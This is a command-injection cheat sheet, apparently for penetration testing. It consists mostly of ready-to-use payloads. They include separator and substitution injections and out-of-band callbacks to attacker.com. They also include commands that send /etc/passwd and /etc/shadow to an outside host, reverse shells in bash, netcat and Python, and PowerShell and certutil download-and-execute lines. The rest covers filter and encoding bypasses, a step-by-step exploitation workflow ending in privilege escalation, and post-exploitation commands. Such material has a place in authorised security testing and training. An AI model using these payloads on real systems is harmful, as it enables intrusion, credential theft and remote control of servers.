# **📌 What is Command Injection?**

**Command Injection** is a critical web vulnerability where an attacker executes **system-level commands** on the server by injecting malicious input into applications that call OS commands.

It occurs when applications pass **unsanitized user input** to:

* Shell commands
* System binaries
* Command wrappers
* OS interpreters

---

# **📌 Example Vulnerable Code (PHP)**

```php
<?php
$cmd = 'ping -c 4 ' . $_GET['host'];
system($cmd);
?>
```

Attacker enters:

```
8.8.8.8; ls -la
```

Executed command becomes:

```
ping -c 4 8.8.8.8; ls -la
```

---

# **📌 Detection Methodology (Manual + Automated)**

---

# **1️⃣ Command Separator Injection Tests**

### **Semicolon (;)**

```
ping 127.0.0.1;id
echo test;whoami
```

### **Ampersand (&)**

```
ping 127.0.0.1&id
whoami&hostname
```

### **Double Ampersand (&&)**

```
ping 127.0.0.1&&whoami
cd /tmp&&ls -la
```

### **Pipe (|)**

```
whoami|tr a-z A-Z
ls -la|grep root
```

---

# **2️⃣ Command Substitution Tests**

### **Backticks**

```
`whoami`
`id`
```

### **Dollar Substitution**

```
$(whoami)
$(id)
cat $(locate passwd)
```

### **Nested**

```
$(echo `whoami`)
`echo $(hostname)`
```

---

# **3️⃣ Newline Injection Tests**

### **URL Encoded Line Breaks**

```
command1%0acommand2
ping%0aid
```

### **Carriage Return**

```
command1%0dcommand2
echo test%0dcat /etc/passwd
```

---

# **4️⃣ OS Detection Commands**

## **Windows**

```
ver
systeminfo
type C:\Windows\System32\drivers\etc\hosts
net user
dir C:\
```

## **Linux**

```
uname -a
cat /etc/issue
cat /proc/version
lsb_release -a
cat /etc/passwd
```

---

# **5️⃣ Out-of-Band (OOB) Command Injection Tests**

### **DNS**

```
nslookup uniq.attacker.com
ping uniq.attacker.com
dig uniq.attacker.com
```

### **HTTP**

```
wget http://attacker.com/abc
curl http://attacker.com/abc
```

### **PowerShell**

```
powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com')
```

---

# **6️⃣ Time-Based Command Injection**

## **Linux**

```
sleep 10
ping -c 10 127.0.0.1
```

## **Windows**

```
timeout 10
ping -n 10 127.0.0.1
Start-Sleep -s 10
```

---

# **7️⃣ Automated Tools**

### **Nuclei**

```
nuclei -u http://target.com -t cmd-injection/
```

### **Commix**

```
commix --url="http://target.com/page?param=test"
```

### **Burp Suite**

* Repeater
* Intruder
* Extensions: ActiveScan++

---

# **📌 ATTACK VECTORS**

---

# **8️⃣ Direct Command Execution**

## **Linux**

```
; cat /etc/passwd
; ls -la /
; id
; pwd
```

## **Windows**

```
& dir
& type C:\Windows\System32\drivers\etc\hosts
& whoami
```

---

# **9️⃣ Command Substitution**

### **Backtick**

```
`id`
`whoami`
```

### **Dollar**

```
$(id)
$(whoami)
```

### **Nested**

```
$(echo `hostname`)
`echo $(id)`
```

---

# **🔟 Data Exfiltration Techniques**

### **File Exfil**

```
cat /etc/passwd > /dev/tcp/attacker.com/4444
```

### **Base64 + HTTP**

```
base64 /etc/shadow | curl -d @- http://attacker.com
```

### **Network Enumeration**

```
netstat -an | nc attacker.com 4444
```

---

# **1️⃣1️⃣ Reverse Shell Payloads**

## **Linux Reverse Shells**

### **Bash**

```
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### **Netcat**

```
nc -e /bin/sh 10.0.0.1 4444
```

### **Netcat FIFO**

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### **Python**

```
python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## **Windows Reverse Shells**

### **PowerShell**

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command <reverse-shell>
```

### **Certutil Download & Execute**

```
certutil -urlcache -split -f http://10.0.0.1/shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe
```

---

# **📌 BYPASS TECHNIQUES**

---

# **1️⃣2️⃣ Blacklist Bypasses**

### **Command Obfuscation**

```
w'h'o'am'i
w"h"o"am"i
\w\h\o\a\m\i
```

### **Alternative Commands**

Instead of:

```
cat /etc/passwd
```

Use:

```
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
```

### **Command Reversal**

```
$(rev<<<'imaohw')   # reversed "whoami"
```

---

# **1️⃣3️⃣ Space Bypasses**

### **IFS**

```
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
```

### **Tabs / Newlines**

```
cat</etc/passwd
```

### **Brace Expansion**

```
{cat,/etc/passwd}
```

### **Hex/Unicode whitespace**

```
cat$'\x20'/etc/passwd
```

---

# **1️⃣4️⃣ Environment Variable Abuse**

### **Variable replace**

```
CMD=whoami
$CMD
```

### **Base64 decode**

```
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

### **Hex decode**

```
bash<<<$(xxd -r -p<<<77686f616d69)
```

---

# **1️⃣5️⃣ PATH Bypasses**

### **Absolute paths**

```
/usr/bin/whoami
/bin/cat /etc/passwd
```

### **Custom PATH**

```
PATH=/usr/bin:$PATH; whoami
```

### **Binary enumeration**

```
which ls | xargs /bin/ls
```

---

# **1️⃣6️⃣ Filter Evasion Techniques**

### **Single/Dual quotes**

```
'cat'</etc/passwd
"w"h"o"a"m"i
```

### **Wildcards**

```
/???/??t /??c/p??s??
```

### **Aliases**

```
alias ls=whoami; ls
```

### **Double Encoding**

```
$(echo -e "\x77\x68\x6f\x61\x6d\x69")
```

---

# **1️⃣7️⃣ Character Encoding Bypasses**

### **URL encoding**

```
whoami%0Acat%20/etc/passwd
```

### **HTML encoding**

```
&#119;&#104;&#111;&#97;&#109;&#105;  # whoami
```

### **Unicode lookalikes**

Use homoglyphs to bypass filters:

```
㎗㎘㎙㎚㎛   # Unicode variants
```

---

# **📌 ADVANCED COMMAND INJECTION TYPES**

---

# **1️⃣8️⃣ PHP Wrappers**

```
php://filter
php://input
data://
expect://
```

### Example:

```
?cmd=system('id');
```

---

# **1️⃣9️⃣ Node.js child_process Injection**

```
child_process.exec("ping " + user_input)
```

Payload:

```
127.0.0.1; whoami
```

---

# **2️⃣0️⃣ Python Subprocess Injection**

```
subprocess.call("ping " + host, shell=True)
```

Attack:

```
8.8.8.8; id
```

---

# **2️⃣1️⃣ Windows WMI Injection**

```
wmic process call create "cmd.exe /c whoami"
```

---

# **📌 COMPLETE EXPLOITATION WORKFLOW**

1️⃣ Detect reflection or blind indicator
2️⃣ Try separators (`;`, `&&`, `|`)
3️⃣ Try command substitution (`\`cmd``or`$(cmd)`)
4️⃣ Try newline & encoding bypass
5️⃣ Try OOB (DNS/HTTP callback)
6️⃣ Identify OS
7️⃣ Enumerate system
8️⃣ Extract sensitive files
9️⃣ Attempt reverse shell
🔟 Privilege escalation

---

# **📌 POST-EXPLOITATION QUICK COMMANDS**

### Linux

```
id
whoami
hostname
uname -a
netstat -ano
find / -perm -4000
```

### Windows

```
whoami /priv
systeminfo
net user
tasklist
```

---

